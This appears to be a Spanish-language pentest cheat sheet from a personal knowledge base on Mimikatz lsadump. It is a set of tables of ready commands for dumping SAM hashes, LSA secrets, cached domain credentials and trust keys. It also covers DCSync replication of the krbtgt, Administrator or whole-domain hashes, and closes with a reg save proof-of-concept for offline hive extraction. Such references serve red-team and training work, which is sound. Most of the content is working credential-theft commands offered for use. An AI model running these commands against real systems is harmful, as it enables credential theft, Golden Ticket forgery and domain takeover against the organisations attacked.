---
aliases:
  - Mimikatz lsadump
tags:
  - technique/credential-access
  - env/windows
  - tool/mimikatz
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Mimikatz Cheatsheet]]"
  - "[[DCSync]]"
  - "[[NTDS.dit Extraction]]"
---
# Mimikatz - lsadump (SAM / LSA / DCSync)

> Extrae secretos de SAM local, LSA secrets, cached creds, trust keys, y replica el NTDS vía DCSync.

---

## SAM / LSA / Cache (local)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `lsadump::sam` | Hashes de cuentas locales (SAM) | Admin local en el host. |
| `lsadump::secrets` | LSA secrets (passwords de service accounts, etc.) | Secrets del host. |
| `lsadump::cache` | Domain cached creds (DCC2/MSCASHv2) | Logon offline, crack lento. |
| `lsadump::trust /patch` | Trust keys entre dominios | Pivot inter-domain. |
^mimi-lsadump-local

## Desde Hives Robados (offline)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `lsadump::sam /sam:SAM /system:SYSTEM` | Hashes SAM desde hives exportados | `reg save` previo. |
| `lsadump::secrets /security:SECURITY /system:SYSTEM` | LSA secrets offline | Sin tocar LSASS. |
^mimi-lsadump-offline

## DCSync (replicación)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `lsadump::dcsync /domain:corp.local /user:krbtgt` | Hash de krbtgt (Golden Ticket) | Con replication rights → [[DCSync]]. |
| `lsadump::dcsync /domain:corp.local /user:Administrator` | Hash de un usuario específico | Targeted. |
| `lsadump::dcsync /domain:corp.local /all /csv` | Dump completo del dominio | Volcado masivo (alternativa a [[NTDS.dit Extraction]]). |
^mimi-lsadump-dcsync

### PoC offline (hives)

```cmd
reg save HKLM\SAM sam.save & reg save HKLM\SYSTEM sys.save & reg save HKLM\SECURITY sec.save
mimikatz # lsadump::sam /sam:sam.save /system:sys.save
```
